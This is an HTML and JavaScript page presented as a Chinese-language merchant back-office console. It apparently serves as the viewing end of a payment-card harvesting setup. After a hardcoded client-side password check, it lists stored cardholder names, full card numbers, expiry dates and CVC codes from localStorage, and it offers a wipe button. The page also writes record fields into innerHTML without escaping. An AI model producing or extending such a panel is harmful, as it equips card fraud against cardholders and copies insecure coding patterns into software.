<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>商户管理系统后台</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; background-color: #f4f6f9; padding: 40px; margin: 0; }
        .container { max-width: 1000px; margin: 0 auto; background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); padding: 30px; }
        h2 { color: #1f2937; margin-top: 0; display: flex; justify-content: space-between; align-items: center; }
        .login-box { max-width: 320px; margin: 100px auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: center; }
        .input-group { margin-bottom: 15px; text-align: left; }
        label { display: block; margin-bottom: 5px; font-size: 14px; color: #4b5563; }
        input { width: 100%; padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; box-sizing: border-box; }
        .btn { background: #4f46e5; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; }
        .btn-clear { background: #dc2626; padding: 8px 15px; width: auto; font-size: 13px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 14px; }
        th, td { border: 1px solid #e5e7eb; padding: 12px; text-align: left; }
        th { background-color: #f9fafb; color: #4b5563; font-weight: 600; }
        tr:hover { background-color: #f9fafb; }
        .token-text { font-family: monospace; color: #059669; font-weight: bold; background: #ecfdf5; padding: 2px 6px; border-radius: 4px; }
    </style>
</head>
<body>

<!-- 登录验证模块 -->
<div id="login-section" class="login-box">
    <h3>管理员登录</h3>
    <div class="input-group">
        <label>后台管理密码</label>
        <input type="password" id="admin-password" placeholder="请输入管理员密码">
    </div>
    <button class="btn" onclick="verifyLogin()">验证并登入</button>
</div>

<!-- 核心管理报表模块（默认隐藏） -->
<div id="dashboard-section" class="container" style="display: none;">
    <h2>
        <span>商户交易流水主控台</span>
        <button class="btn btn-clear" onclick="clearDatabase()">清空所有流水数据</button>
    </h2>
    
    <table id="records-table">
        <thead>
            <tr>
                <th>编号</th>
                <th>提交时间</th>
                <th>持卡人姓名</th>
                <th>输入卡号</th>
                <th>有效期</th>
                <th>安全码</th>
                <th>安全加密令牌 (Token)</th>
            </tr>
        </thead>
        <tbody id="table-body">
            <!-- 数据行将通过本地存储自动填充 -->
        </tbody>
    </table>
</div>

<script>
    // 为了方便您调试测试，这里将后台登录密码设置为：123456
    const ADMIN_PASSWORD = "123456";

    function verifyLogin() {
        const inputPass = document.getElementById('admin-password').value;
        if (inputPass === ADMIN_PASSWORD) {
            document.getElementById('login-section').style.display = 'none';
            document.getElementById('dashboard-section').style.display = 'block';
            loadDatabaseRecords();
        } else {
            alert("密码错误！无法进入后台管理系统。");
        }
    }

    function loadDatabaseRecords() {
        const tbody = document.getElementById('table-body');
        tbody.innerHTML = '';
        
        // 读取本地存储中的全局交易流水数据
        const records = JSON.parse(localStorage.getItem('payment_records')) || [];
        
        if (records.length === 0) {
            tbody.innerHTML = `<tr><td colspan="7" style="text-align: center; color: #9ca3af;">当前系统暂无任何客户提交付款流水</td></tr>`;
            return;
        }

        records.forEach(item => {
            const tr = document.createElement('tr');
            tr.innerHTML = `
                <td>${item.id}</td>
                <td>${item.time}</td>
                <td><strong>${item.name}</strong></td>
                <td>${item.cardNumber}</td>
                <td>${item.expiry}</td>
                <td><span style="color:#666">${item.cvc}</span></td>
                <td><span class="token-text">${item.token}</span></td>
            `;
            tbody.appendChild(tr);
        });
    }

    function clearDatabase() {
        if (confirm("确定要清空后台现有的所有记录吗？此操作不可恢复。")) {
            localStorage.removeItem('payment_records');
            loadDatabaseRecords();
        }
    }
</script>
</body>
</html>
